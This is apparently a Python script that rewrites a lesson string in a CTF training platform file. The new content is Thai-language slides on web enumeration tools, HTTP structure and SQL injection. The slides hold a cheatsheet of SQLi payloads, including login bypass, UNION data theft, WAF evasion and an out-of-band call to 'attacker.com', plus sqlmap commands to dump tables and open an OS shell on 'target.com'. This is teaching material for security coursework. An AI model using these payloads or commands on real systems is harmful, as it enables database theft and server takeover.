import os

file_path = "/home/kali/crru_ctf/CTFd/term_w36_web_app_complete_v5.py"

with open(file_path, "r", encoding="utf-8") as f:
    code = f.read()

# Locate the beginning of the val178_0 string
start_marker = 'val178_0 = """## 💉 Path Traversal'
start_idx = code.find(start_marker)
if start_idx == -1:
    print("Error: Could not find start marker in the file.")
    exit(1)

# Find the next triple quotes closing the string
end_idx = code.find('"""', start_idx + len(start_marker))
if end_idx == -1:
    print("Error: Could not find closing triple quotes.")
    exit(1)

# Include the closing triple quotes
end_pos = end_idx + 3

# Define the new val178_0 string content
new_val178_0 = """val178_0 = \"\"\"## 💉 Path Traversal, HTTP Messages & SQLi (การโจมตีพาธ, โครงสร้างเว็บ และการฝังคำสั่งฐานข้อมูล)
---

ยินดีต้อนรับสู่บทเรียนการสืบค้นข้อมูลเชิงลึกผ่านเส้นทางโฟลเดอร์เครือข่าย, โครงสร้าง HTTP Message และเจาะลึกการโจมตี SQL Injection & Command Injection

### 📄 SLIDE 51-58: เครื่องมือสแกนหาความสัมพันธ์ไฟล์ระบบ (Path Traversal Tools)
การค้นหาไดเรกทอรีลับหรือหน้าล็อกอินระบบหลังบ้านโดยใช้โปรแกรมแสกนความปลอดภัยอัตโนมัติ:

#### 📁 Dirb (Directory brute-forcing)
- **คุณลักษณะ**: สั่งรันผ่าน Command Line เพื่อสุ่มเดาชื่อไฟล์และโฟลเดอร์ โดยส่งอิงจาก Wordlist มาตรฐาน
- **ตัวอย่างการสแกนปกติ**:
  ```bash
  dirb https://target.com /usr/share/wordlists/dirb/common.txt
  ```
- **ตัวอย่างการสแกนหาไฟล์แบ็คอัปตามประเภทนามสกุล**:
  ```bash
  dirb https://target.com /usr/share/wordlists/dirb/common.txt -X .bak,.zip,.tar
  ```

#### 📁 Dirbuster (GUI-based fuzzer)
- **คุณลักษณะ**: เวอร์ชัน Graphic User Interface (มีหน้าต่างให้กดปรับแต่ง) เหมาะสำหรับการรันหาพาเนลแอดมินหรือทรัพยากรเว็บแบบเห็นภาพ

#### 📁 FFUF (Fast Web Fuzzer)
- **คุณลักษณะ**: fuzzer ความเร็วสูงในสายงานเจาะระบบ มีลูกเล่น recursive ค้นหาเส้นทางเชิงลึกแบบซับซ้อน
- **ตัวอย่างการสแกน**:
  ```bash
  ffuf -u https://target.com/admin/FUZZ -w /usr/share/wordlists/rockyou.txt
  ```

#### 📁 Gobuster (Go-written scanner)
- **คุณลักษณะ**: พัฒนาขึ้นมาด้วยภาษา Go ทำให้ข้ามขีดจำกัดความเร็วของเครื่องมืออื่นๆ มาก
- **ตัวอย่างการค้นหาไฟล์ .php**:
  ```bash
  gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php
  ```

---

### 📄 SLIDE 59-75: HTTP Message Anatomy (โครงสร้างทราฟฟิกเว็บ)
- **HTTP Request**: ทราฟฟิกข้อมูลที่ฝั่ง Client ส่งหาเซิร์ฟเวอร์ ประกอบด้วย:
  - **Method**: คำสั่งการทำงาน เช่น GET (ดึงข้อมูล), POST (ส่งประมวลผล), PUT (ปรับปรุงไฟล์), DELETE (ลบไฟล์)
  - **Path**: พิกัดเป้าหมาย เช่น `/api/user?id=123`
  - **Protocol**: ระบุรุ่นการส่ง เช่น `HTTP/1.1` หรือ `HTTP/2`
  - **Headers**: เมทาดาตาเสริม เช่น User-Agent (ระบุประเภทบราวเซอร์), Cookie (ระบุสิทธิ์)
  - **Body**: ข้อมูลชุดใหญ่ที่ฝั่งเซิร์ฟเวอร์นำไปประมวลผล (มีผลเฉพาะ POST/PUT)
- **HTTP Response**: ทราฟฟิกตอบกลับจากเซิร์ฟเวอร์ ประกอบด้วย:
  - **Status Line**: แจ้งรหัสผลลัพธ์ เช่น `200 OK` (สำเร็จ), `301 Moved` (ย้ายหน้า), `401 Unauthorized` (ไม่ผ่านสิทธิ์), `403 Forbidden` (ห้ามเข้า), `404 Not Found` (ไม่พบไฟล์), `500 Server Error` (เซิร์ฟเวอร์พัง)
  - **Server**: แจ้งโปรแกรมที่รันบนเครื่อง เช่น Apache, Nginx
  - **Headers**: เช่น Content-Type (ประเภทผลลัพธ์)
  - **Body**: ซอร์สโค้ด HTML หรือข้อมูล JSON ที่บราวเซอร์นำมาวาดแสดงผล
- **cURL Command**: โปรแกรมรัน Command Line ยอดนิยมในการยิงขอเรียกข้อมูลดิบจากเซิร์ฟเวอร์
  - **ตัวอย่าง**: สั่งดึงเฉพาะ Header ของเป้าหมายเพื่อตรวจความปลอดภัย:
    ```bash
    curl -I https://www.example.com
    ```

---

### 📄 SLIDE 76-90: Malicious HTTP Message Detections (การตรวจสอบภัยคุกคาม)
- **Unusual HTTP Methods**: นักโจมตีใช้ประโยชน์จากเมธอดพิเศษ เช่น OPTIONS, TRACE หรือ WebDAV (MKCOL, COPY) เพื่อตรวจและควบคุมไฟล์เซิร์ฟเวอร์
- **Unusual User-Agents**: แฮกเกอร์ใช้โปรแกรมโจมตี ซึ่งตัวโปรแกรมจะแนบ User-Agent แปลกปลอมมา (เช่น `sqlmap/1.5.2`, `HackerTool/1.0`, `python-requests`, `Nmap compatible`) แอดมินจึงควรเฝ้าระวังหรือปิดกั้นทราฟฟิกเหล่านี้
- **Large/Encoded POST**: การลอบส่ง Web Shell หรือคำสั่งยิงเจาะโดยเข้ารหัส Base64 หรือ Hex เพื่อให้ผ่านพ้นระบบ WAF (Web Application Firewall)

---

### 📄 SLIDE 91-100: SQL Injection (SQLi) Introduction & Concepts
- **คำจำกัดความ**: SQL Injection (SQLi) คือหนึ่งในภัยคุกคามทางเว็บที่ร้ายแรงที่สุด เกิดขึ้นเมื่อแอปพลิเคชันนำข้อมูลอินพุตที่ป้อนจากฝั่งผู้ใช้ไปเชื่อมต่อหรือต่อสตริงเข้ากับประโยคคิวรีของฐานข้อมูลโดยตรงโดยไม่มีการกรองตรวจสอบความรัดกุม (Sanitize) ส่งผลให้แฮกเกอร์สามารถสอดแทรกประโยคคำสั่ง SQL เพื่อควบคุม ค้นหา ดึง หรือล้างฐานข้อมูลหลังบ้านได้
- **ลิงก์ศึกษาเพิ่มเติมการป้องกัน SQLi**: [How to Stop SQL Injection](https://www.indusface.com/blog/how-to-stop-sql-injection/)

#### 💻 ตัวอย่างโครงสร้างคิวรีเมื่อเกิดภัยคุกคาม (Normal vs Malicious Query)

<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 1.5rem 0;">
<div style="background: rgba(16, 185, 129, 0.05); border: 1px solid rgba(16, 185, 129, 0.2); border-radius: 8px; padding: 16px;">
<div style="font-weight: bold; color: #10b981; font-size: 0.85rem; margin-bottom: 8px;">🟢 1. การตรวจสอบคิวรีปกติ (Normal SQL Query)</div>
<p style="font-size: 0.76rem; color: #cbd5e1; line-height: 1.5; margin: 0 0 10px;">
ผู้ใช้งานทั่วไปกรอกข้อมูลปกติเข้าสู่ระบบ:
<br>• Username: <code>admin</code>
<br>• Password: <code>p@ssW0rd</code>
</p>
<pre style="background: #02040a; color: #a7f3d0; border: 1px solid rgba(255,255,255,0.05); border-radius: 6px; padding: 10px; font-size: 0.7rem; font-family: monospace; margin: 0;">SELECT * FROM users 
WHERE username = 'admin' 
AND password = 'p@ssW0rd';</pre>
</div>
<div style="background: rgba(239, 68, 68, 0.05); border: 1px solid rgba(239, 68, 68, 0.2); border-radius: 8px; padding: 16px;">
<div style="font-weight: bold; color: #ef4444; font-size: 0.85rem; margin-bottom: 8px;">🔴 2. การบายพาสยืนยันตัวตน (Authentication Bypass)</div>
<p style="font-size: 0.76rem; color: #cbd5e1; line-height: 1.5; margin: 0 0 10px;">
แฮกเกอร์ส่งคอมเมนต์ไปปิดการเช็ครหัสผ่านด้านหลัง:
<br>• Username: <code>admin' --</code>
<br>• Password: <code>xxx</code> (อะไรก็ได้)
</p>
<pre style="background: #02040a; color: #fca5a5; border: 1px solid rgba(239, 68, 68, 0.15); border-radius: 6px; padding: 10px; font-size: 0.7rem; font-family: monospace; margin: 0;">SELECT * FROM users 
WHERE username = 'admin' --' 
AND password = 'xxx';</pre>
</div>
</div>

---

### 📄 SLIDE 101-110: Advanced SQL Injection Techniques (เทคนิคการยิงเจาะระบบฐานข้อมูล)

#### 📂 Error-Based SQL Injections: Stealing Data (ดึงข้อมูลผ่านผลลัพธ์ที่เป็นจริง)
เมื่อเว็บยอมรับค่า User ID เพื่อนำไปแสดงผล แฮกเกอร์ป้อนเงื่อนไขที่เป็นจริงเสมอลงไป:
- **ข้อมูลที่ป้อน (Payload)**: `id = ' OR '1'='1`
- **ประโยค Query หลังบ้าน**:
  ```sql
  SELECT id, name FROM users WHERE id = '' OR '1'='1';
  ```
- **คำอธิบาย**: ตรรกะเงื่อนไขเปรียบเทียบ `id = ''` เป็นเท็จ (False) แต่ `'1'='1'` เป็นจริง (True) ทำให้ผลลัพธ์ประโยคคือ `F ∨ T` ได้ผลรวมเป็น **จริง (True)** เสมอ ส่งผลให้ระบบดึงรายชื่อและข้อมูลผู้ใช้ทุกคนในตารางออกมาแสดงผล (เช่น สมชาย ดีใจ, วงศยศ เกียรติศรี)

#### 📂 UNION-Based SQL Injections (ดึงข้อมูลตารางอื่นมารวมแสดงผล)
เมื่อต้องการควบรวมผลลัพธ์ของคิวรีหลัก เข้ากับตารางอื่นที่ต้องการแอบสืบค้นข้อมูล:
- **ข้อมูลที่ป้อน (Payload)**: `' UNION SELECT username, password FROM users --`
- **ประโยค Query หลังบ้าน**:
  ```sql
  SELECT id, name FROM users WHERE id = '' UNION SELECT username, password FROM users --';
  ```
- **คำอธิบาย**: ระบบจะนำผลลัพธ์ของตารางแฮกเกอร์มาปนแสดงผล ทำให้รหัสผ่านและชื่อผู้ใช้งานในตาราง `users` ถูกขโมยออกไปทันที

#### 📂 Blind SQL Injections (Boolean-Based) (การสืบข้อมูลด้วยคำถามจริง/เท็จ)
ในกรณีที่หน้าเว็บไม่มีการแจ้งข้อผิดพลาดและไม่แสดงผลลัพธ์ตารางโดยตรง แฮกเกอร์จะส่งเงื่อนไขไปถามเว็บว่าถ้าเป็นจริงให้โหลดหน้าปกติ ถ้าเป็นเท็จให้แสดงอีกแบบ:
- **ข้อมูลที่ป้อน (Payload)**: `' OR (SELECT SUBSTRING(database(),1,1)) = 'm' --`
- **ประโยค Query หลังบ้าน**:
  ```sql
  SELECT id, name FROM users WHERE id = '' OR (SELECT SUBSTRING(database(),1,1)) = 'm' --';
  ```
- **คำอธิบาย**: หากตัวอักษรตัวแรกของชื่อฐานข้อมูลขึ้นต้นด้วยตัวอักษร `'m'` หน้าเว็บจะโหลดเรียบร้อยตามเงื่อนไขที่เป็นจริง หากไม่ใช่ ระบบจะไม่แสดงข้อมูลใดๆ ทำให้แฮกเกอร์สามารถแกะตัวอักษรของข้อมูลออกมาได้ทีละตัวจากการทดสอบซ้ำๆ

---

### 📄 SLIDE 111-125: SQL Injection Payload Cheatsheet (ตารางสรุปคีย์เจาะระบบ)
รายการ Payload ยอดนิยมอ้างอิงจากคลังซอร์สระดับสากล เพื่อการวิเคราะห์ทราฟฟิกล็อกและตรวจสอบความปลอดภัย:

<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 12px; font-weight: bold; width: 220px;">ประเภทช่องโหว่ (Category)</th>
<th style="padding: 12px; font-weight: bold; font-family: monospace;">คีย์เจาะระบบ (Payload)</th>
<th style="padding: 12px; font-weight: bold;">ผลลัพธ์และคำอธิบาย (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">Authentication Bypass</td>
<td style="padding: 12px; font-family: monospace; color: #f43f5e;">' OR '1'='1' --</td>
<td style="padding: 12px;">ทำให้เงื่อนไขตรวจสอบเป็นจริงเสมอเพื่อข้ามผ่านระบบตรวจสอบสิทธิ์ล็อกอิน</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">Authentication Bypass (Cont)</td>
<td style="padding: 12px; font-family: monospace; color: #f43f5e;">admin' --</td>
<td style="padding: 12px;">ล็อกอินเป็นผู้ใช้งานชื่อ "admin" โดยตัดบรรทัดตรวจเช็ค Password ออกไปด้านหลัง</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">UNION-Based SQLi</td>
<td style="padding: 12px; font-family: monospace; color: #3b82f6;">' UNION SELECT null, username, password FROM users --</td>
<td style="padding: 12px;">ดึงรายชื่อและรหัสผ่านจากตาราง users มารวมในผลลัพธ์การแสดงผลหลัก</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">UNION-Based SQLi (Cont)</td>
<td style="padding: 12px; font-family: monospace; color: #3b82f6;">' UNION SELECT database(), user(), version() --</td>
<td style="padding: 12px;">เรียกดูข้อมูลรายละเอียดของฐานข้อมูล สิทธิ์ผู้รัน และรุ่นซอฟต์แวร์ระบบ</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">UNION-Based Schema Enum</td>
<td style="padding: 12px; font-family: monospace; color: #3b82f6;">' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --</td>
<td style="padding: 12px;">ดึงรายชื่อตาราง (Table Names) ทั้งหมดที่มีอยู่ในฐานข้อมูลปัจจุบัน</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">Error-Based SQLi</td>
<td style="padding: 12px; font-family: monospace; color: #fbbf24;">' AND (SELECT @@version) --</td>
<td style="padding: 12px;">สั่งรันคำสั่งตรวจสอบเวอร์ชันของเซิร์ฟเวอร์ฐานข้อมูลโดยตรง</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">Error-Based (Forced Error)</td>
<td style="padding: 12px; font-family: monospace; color: #fbbf24;">' AND 1=convert(int, (SELECT @@version)) --</td>
<td style="padding: 12px;">บังคับให้เกิดข้อผิดพลาดในการแปลงประเภทข้อมูล เพื่อส่งข้อมูลเวอร์ชันออกมาพร้อมคำอธิบายความผิดพลาด</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">Boolean-Based Blind SQLi</td>
<td style="padding: 12px; font-family: monospace; color: #10b981;">' AND (SELECT SUBSTRING(database(),1,1)) = 'm' --</td>
<td style="padding: 12px;">ทดสอบว่าตัวอักษรตัวแรกของชื่อระบบฐานข้อมูลเป็นอักษร 'm' หรือไม่</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">Time-Based Blind SQLi</td>
<td style="padding: 12px; font-family: monospace; color: #a855f7;">' OR IF(1=1, SLEEP(5), 0) --</td>
<td style="padding: 12px;">สั่งหน่วงเวลาการตอบสนอง 5 วินาทีหากประโยคทดสอบตรรกะเป็นจริง เพื่อแกะข้อมูลแบบไม่เห็นผลหน้าจอ</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">Out-of-Band (OOB) SQLi</td>
<td style="padding: 12px; font-family: monospace; color: #6366f1;">' UNION SELECT LOAD_FILE('//attacker.com/data') --</td>
<td style="padding: 12px;">สั่งให้เครื่องแม่ข่ายฐานข้อมูลดึงไฟล์หรือเชื่อมต่อไปยังเครือข่ายภายนอกของแฮกเกอร์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-weight: bold; color: #ffffff;">WAF Bypass Techniques</td>
<td style="padding: 12px; font-family: monospace; color: #ec4899;">admin'/**/OR/**/1=1/**/--</td>
<td style="padding: 12px;">ใช้ตัวอักษรคอมเมนต์แบบหลายบรรทัด <code>/**/</code> เพื่อเลี่ยงการตรวจจำเศษช่องว่างของตัวกรองเว็บ (WAF Bypass)</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 126-140: SQL Injections: SQLMap (เครื่องมือเจาะระบบฐานข้อมูลอัตโนมัติ)
**SQLMap** คือโปรแกรมภาษา Python แบบ Command Line ยอดนิยมระดับโลกที่ออกแบบมาเพื่อสืบค้นหาช่องโหว่ วิเคราะห์ และดำเนินการโจมตีช่องโหว่ประเภท SQL Injection บนเว็บบอร์ดหรือแอปพลิเคชันเป้าหมายได้โดยอัตโนมัติ:
- สามารถสแกนและดึงสคีมาฐานข้อมูล, รายชื่อผู้ใช้ รหัสผ่านแฮช และเข้าครอบครองสิทธิ์การรันคำสั่งเครื่องแม่ข่ายเซิร์ฟเวอร์ย่อยได้
- **ลิงก์ศึกษาการใช้งาน**: [TryHackMe SQLMap Room](https://tryhackme.com/room/sqlmap)

#### 🛠️ ตารางสรุปออปชันคำสั่งยอดนิยมของ SQLMap (Cheatsheet)

<h5 style="margin: 1.5rem 0 0.5rem; font-size: 0.82rem; color: #00f0ff;">1. ข้อมูลการป้อนเรียกใช้งานพื้นฐาน (Basic Options)</h5>
<div style="overflow-x: auto; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 1.5rem;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 200px;">คำสั่ง (Option)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">-u &lt;URL&gt;</td>
<td style="padding: 10px;">ระบุ URL เป้าหมาย (เช่น <code>-u "http://target.com/index.php?id=1"</code>)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--data "&lt;POST_DATA&gt;"</td>
<td style="padding: 10px;">กำหนดตัวแปรเมื่อต้องการทดสอบแบบยิงขอผ่าน POST request (เช่น <code>--data="user=admin&amp;pass=1"</code>)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--cookie "&lt;COOKIE&gt;"</td>
<td style="padding: 10px;">แนบค่า Session Cookie เพื่อสวมสิทธิ์การทดสอบสำหรับโซนจำกัดสิทธิ์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--random-agent</td>
<td style="padding: 10px;">สุ่มเปลี่ยนค่า User-Agent เสมือนเว็บบราวเซอร์ต่างๆ เพื่อผ่านตัวบล็อกจำพวก Scanner</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--proxy "&lt;PROXY&gt;"</td>
<td style="padding: 10px;">ส่งทราฟฟิกทดสอบผ่าน Proxy เช่น Burp Suite เพื่อวิเคราะห์การทำงาน (เช่น <code>--proxy="http://127.0.0.1:8080"</code>)</td>
</tr>
</tbody>
</table>
</div>

<h5 style="margin: 1.5rem 0 0.5rem; font-size: 0.82rem; color: #a855f7;">2. การสืบข้อมูลโครงสร้างฐานข้อมูล (Database Enumeration)</h5>
<div style="overflow-x: auto; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 1.5rem;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #a855f7;">
<th style="padding: 10px; font-weight: bold; width: 200px;">คำสั่ง (Option)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #f3e8ff;">--dbs</td>
<td style="padding: 10px;">ดึงรายชื่อฐานข้อมูล (Databases) ทั้งหมดที่อยู่ในเครื่องเป้าหมาย</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #f3e8ff;">-D &lt;database&gt;</td>
<td style="padding: 10px;">กำหนดเพื่อเจาะจงฐานข้อมูลเป้าหมายตัวใดตัวหนึ่ง</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #f3e8ff;">--tables</td>
<td style="padding: 10px;">ดึงรายชื่อตาราง (Tables) ทั้งหมดที่มีอยู่ในฐานข้อมูลที่ระบุไว้</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #f3e8ff;">-T &lt;table&gt;</td>
<td style="padding: 10px;">กำหนดเลือกตารางข้อมูลเพื่อระบุย่อยเป้าหมายในการดึงฟิลด์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #f3e8ff;">--columns</td>
<td style="padding: 10px;">ดึงฟิลด์หรือรายชื่อคอลัมน์ (Columns) ทั้งหมดในตารางที่เลือกไว้</td>
</tr>
</tbody>
</table>
</div>

<h5 style="margin: 1.5rem 0 0.5rem; font-size: 0.82rem; color: #fbbf24;">3. การดึงชุดข้อมูลภายในตาราง (Data Extraction)</h5>
<div style="overflow-x: auto; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 1.5rem;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #fbbf24;">
<th style="padding: 10px; font-weight: bold; width: 200px;">คำสั่ง (Option)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #fef3c7;">--dump</td>
<td style="padding: 10px;">ดาวน์โหลดข้อมูลแถวทั้งหมดในตารางหรือคอลัมน์ที่สืบค้นออกมาแสดง</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #fef3c7;">--dump-all</td>
<td style="padding: 10px;">สั่งดาวน์โหลดตารางข้อมูลทั้งหมดของฐานข้อมูลเครื่องเป้าหมาย (อาจใช้เวลานาน)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #fef3c7;">--where="&lt;cond&gt;"</td>
<td style="padding: 10px;">ดึงข้อมูลเฉพาะแถวที่มีสิทธิ์ตามเงื่อนไข (เช่น <code>--where="role='admin'"</code>)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #fef3c7;">--sql-shell</td>
<td style="padding: 10px;">เปิดหน้าจำลองรันชุดคิวรี SQL แบบโต้ตอบได้เสมือนนั่งอยู่ในเซิร์ฟเวอร์ฐานข้อมูล</td>
</tr>
</tbody>
</table>
</div>

<h5 style="margin: 1.5rem 0 0.5rem; font-size: 0.82rem; color: #ec4899;">4. การควบคุมและยึดระบบชั้นสูง (Advanced Exploits)</h5>
<div style="overflow-x: auto; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 1.5rem;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #ec4899;">
<th style="padding: 10px; font-weight: bold; width: 200px;">คำสั่ง (Option)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #fce7f3;">--passwords</td>
<td style="padding: 10px;">ดึงรหัสผ่านผู้ใช้งานในฐานข้อมูลพร้อมทำการวิเคราะห์แฮชรหัสผ่านออกหน้าจอ</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #fce7f3;">--is-dba</td>
<td style="padding: 10px;">ตรวจสอบว่าผู้ใช้เชื่อมต่อฐานข้อมูลปัจจุบันถือสิทธิ์ระดับแอดมินสูงสุด (DBA) หรือไม่</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #fce7f3;">--os-shell</td>
<td style="padding: 10px;">ดำเนินการเจาะลึกเพื่อสร้าง Terminal shell สำหรับพิมพ์รันคำสั่งควบคุมของระบบปฏิบัติการแม่ข่ายเซิร์ฟเวอร์ย่อย</td>
</tr>
</tbody>
</table>
</div>

<h5 style="margin: 1.5rem 0 0.5rem; font-size: 0.82rem; color: #10b981;">5. การก้าวข้ามระบบความปลอดภัย (Security Bypass & Techniques)</h5>
<div style="overflow-x: auto; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 1.5rem;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #10b981;">
<th style="padding: 10px; font-weight: bold; width: 200px;">คำสั่ง (Option)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #ecfdf5;">--tamper=&lt;script&gt;</td>
<td style="padding: 10px;">เรียกใช้สคริปต์สลับฟิลเตอร์เพื่อเข้ารหัสเลี่ยงการตรวจจับของ WAF (เช่น <code>--tamper=randomcase</code>)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #ecfdf5;">--level=1-5</td>
<td style="padding: 10px;">ความลึกในการตรวจสอบหาพาธและพารามิเตอร์แปลกปลอม (ค่าปกติคือ 1, สูงสุดคือ 5)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #ecfdf5;">--risk=1-3</td>
<td style="padding: 10px;">ระดับความเสี่ยงของ Payload ที่ใช้ยิง ซึ่งระดับสูงอาจส่งผลเสียต่อความคงสภาพของระบบ (สูงสุดคือ 3)</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 141-150: SQLMap Command Execution Examples (ตัวอย่างคำสั่งการสแกนจริง)

#### 🟢 การวิเคราะห์หาและดูรายชื่อฐานข้อมูล
เริ่มต้นสแกนตรวจสอบว่าพารามิเตอร์เป้าหมายมีจุดอ่อนตัวใดของฐานข้อมูลบ้าง:
```bash
sqlmap -u "http://target.com/index.php?id=1" --dbs
```

#### 🟢 การไล่ดึงโครงสร้างและดาวน์โหลดข้อมูลตาราง
ดึงรายชื่อตารางของฐานข้อมูลชื่อ `target_db` จากนั้นเข้าไปดึงรายชื่อคอลัมน์คัดกรองในตาราง `users` เพื่อดาวน์โหลดข้อมูล:
```bash
# 1. แสดงรายชื่อตารางข้อมูลทั้งหมด
sqlmap -u "http://target.com/index.php?id=1" -D target_db --tables

# 2. แสดงรายชื่อคอลัมน์ในตารางเป้าหมาย
sqlmap -u "http://target.com/index.php?id=1" -D target_db -T users --columns

# 3. ดาวน์โหลด (Dump) ข้อมูลบัญชีทั้งหมดออกมาเก็บลงไฟล์
sqlmap -u "http://target.com/index.php?id=1" -D target_db -T users --dump
```

#### 🟢 การทดสอบเพื่อก้าวข้ามตัวคัดกรอง (WAF & Login Evading)
สั่งเปลี่ยนตัวอักษรใหญ่-เล็ก เพื่อบายพาสไฟร์วอลล์ หรือทดสอบตัวแปรในการล็อกอินหน้าเว็บ:
```bash
# บายพาส WAF โดยการเปลี่ยนเคสพารามิเตอร์แบบสุ่ม
sqlmap -u "http://target.com/index.php?id=1" --tamper=randomcase

# ทดสอบเจาะหน้าล็อกอินของเป้าหมายผ่านการกรอก POST data
sqlmap -u "http://target.com/login.php" --data="username=admin&password=admin" --dump
```

